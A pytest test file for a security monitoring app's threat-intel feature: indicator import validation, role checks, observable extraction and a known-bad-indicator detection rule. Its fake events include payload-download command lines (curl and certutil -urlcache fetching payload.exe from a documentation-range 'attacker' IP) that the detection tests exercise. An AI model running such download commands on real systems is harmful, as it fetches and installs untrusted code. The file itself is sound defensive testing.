import pytest

from app.detection.threat_intel import MAX_IMPORT_BYTES, IndicatorError, extract_observables, normalize_indicator
from app.models import AuditLog, Event, ThreatIndicator
from tests.test_detection_routes import BASE_EVENT

COLLECTOR_HEADERS = {"X-Collector-Key": "test-collector-key"}


def _login(client, username, password):
    token = client.post("/api/auth/login", json={"username": username, "password": password}).json()["access_token"]
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture()
def admin(client, seed_users):
    return _login(client, "test_admin", "TestAdminPass123!")


def _import(client, headers, text, filename="iocs.csv"):
    return client.post("/api/settings/ti/import", headers=headers, files={"file": (filename, text.encode("utf-8"), "text/csv")})


def _event(**fields):
    return {**BASE_EVENT, "event_id": 4688, "src_ip": None, "timestamp": "2026-10-21T05:00:00+00:00", **fields}


# ---------- Import validation ----------


def test_import_validates_and_dedupes(client, admin, db_session):
    text = "\n".join([
        "type,value,source,tags",
        "ip,203.0.113.50,feed-a,c2;demo",
        "ip,203.0.113.50,feed-b,dup-in-file",
        "domain,Evil.Example,feed-a,",
        "sha256," + "A" * 64 + ",feed-a,",
        "ip,999.1.1.1,feed-a,",          # invalid IP
        "domain,not a domain,feed-a,",    # invalid domain
        "sha256,abc123,feed-a,",          # too short
        "url,http://x.example,feed-a,",   # unknown type
        "# a comment",
    ])
    resp = _import(client, admin, text)
    assert resp.status_code == 201
    body = resp.json()
    assert body["added"] == 3 and body["duplicates"] == 0
    assert [e["line"] for e in body["errors"]] == [6, 7, 8, 9]

    values = {(i.type, i.value) for i in db_session.query(ThreatIndicator).all()}
    assert ("domain", "evil.example") in values  # stored lower-case
    assert ("sha256", "a" * 64) in values

    # Re-importing the same file adds nothing.
    again = _import(client, admin, text).json()
    assert again["added"] == 0 and again["duplicates"] == 3
    assert db_session.query(AuditLog).filter(AuditLog.action == "ti_import").count() == 2


def test_import_rejects_private_ip():
    for value in ("10.1.2.3", "192.168.0.1", "127.0.0.1", "fe80::1"):
        with pytest.raises(IndicatorError):
            normalize_indicator("ip", value)
    # Documentation ranges used by the demo indicators are accepted.
    assert normalize_indicator("ip", "203.0.113.10") == "203.0.113.10"


def test_import_rejects_bad_extension_and_oversize(client, admin, db_session):
    assert _import(client, admin, "ip,203.0.113.1", filename="iocs.exe").status_code == 400
    big = "ip,203.0.113.1,feed,\n" * (MAX_IMPORT_BYTES // 20 + 10)
    resp = _import(client, admin, big)
    assert resp.status_code == 413
    assert db_session.query(ThreatIndicator).count() == 0
    assert db_session.query(AuditLog).filter(AuditLog.action == "ti_import", AuditLog.success.is_(False)).count() == 2


# ---------- RBAC ----------


@pytest.mark.parametrize("username,password", [("test_analyst", "TestAnalystPass123!"), ("test_viewer", "TestViewerPass123!")])
def test_non_admin_gets_403(client, seed_users, username, password):
    headers = _login(client, username, password)
    assert client.get("/api/settings/ti", headers=headers).status_code == 403
    assert _import(client, headers, "ip,203.0.113.1").status_code == 403
    assert client.delete("/api/settings/ti/any", headers=headers).status_code == 403


def test_list_search_and_delete(client, admin, db_session):
    _import(client, admin, "ip,203.0.113.1,feed-a,c2\ndomain,bad.example,feed-b,phish")
    assert len(client.get("/api/settings/ti", headers=admin).json()) == 2
    found = client.get("/api/settings/ti?q=phish", headers=admin).json()
    assert [i["value"] for i in found] == ["bad.example"]

    assert client.delete(f"/api/settings/ti/{found[0]['id']}", headers=admin).status_code == 204
    assert [i["value"] for i in client.get("/api/settings/ti", headers=admin).json()] == ["203.0.113.1"]
    assert db_session.query(AuditLog).filter(AuditLog.action == "ti_delete").count() == 1


# ---------- Matching ----------


def test_extract_skips_private_and_loopback():
    event = Event(
        src_ip="10.0.0.5",
        command_line="ping 192.168.1.1 && curl http://127.0.0.1/x && curl http://203.0.113.10/payload.exe",
        message="Contacted UPDATE-CHECK.example",
    )
    found = extract_observables(event)
    assert ("ip", "203.0.113.10") in found
    assert ("domain", "update-check.example") in found  # case-insensitive
    assert not any(v in {"10.0.0.5", "192.168.1.1", "127.0.0.1"} for _, v in found)


def test_ti_rule_fires_and_badges_appear(client, admin):
    _import(client, admin, "ip,203.0.113.10,demo,payload-server\ndomain,update-check.example,demo,c2")
    events = [
        _event(id="t1", command_line="certutil.exe -urlcache -f HTTP://203.0.113.10/payload.exe out.exe"),
        _event(id="t2", command_line="notepad.exe", message="dns query for Update-Check.Example"),
        _event(id="t3", command_line="ping 10.0.0.1", src_ip="192.168.1.20"),  # private only: no match
    ]
    assert client.post("/api/events/ingest", headers=COLLECTOR_HEADERS, json={"events": events}).status_code == 201

    detections = client.get("/api/detections", headers=admin).json()
    ti = [d for d in detections if d["rule_name"] == "Known-bad indicator seen"]
    assert len(ti) == 1
    assert ti[0]["technique_ids"] == ["T1071"] and ti[0]["severity"] == 7 and ti[0]["confidence"] == 0.8
    assert sorted(ti[0]["matched_event_ids"]) == ["t1", "t2"]
    assert {m["value"] for m in ti[0]["ti_matches"]} == {"203.0.113.10", "update-check.example"}

    page = client.get("/api/events", headers=admin).json()
    by_id = {e["id"]: e["ti_matches"] for e in page["items"]}
    assert by_id["t1"][0]["source"] == "demo" and by_id["t3"] == []

    incident_id = ti[0]["incident_id"]
    timeline = client.get(f"/api/incidents/{incident_id}", headers=admin).json()["timeline"]
    assert any(entry["ti_matches"] for entry in timeline)
    report = client.get(f"/api/incidents/{incident_id}/report", headers=admin).json()
    assert {m["value"] for m in report["ti_matches"]} == {"203.0.113.10", "update-check.example"}


def test_ai_facts_carry_names_only(client, admin, db_session):
    from app.ai.ask import build_facts
    from app.models import Incident

    _import(client, admin, "ip,203.0.113.10,demo,c2")
    client.post("/api/events/ingest", headers=COLLECTOR_HEADERS,
                json={"events": [_event(id="t1", command_line="curl http://203.0.113.10/a")]})
    client.get("/api/detections", headers=admin)
    facts = build_facts(db_session, db_session.query(Incident).first())
    assert facts["threat_intel_matches"] == ["ip indicator listed by demo"]
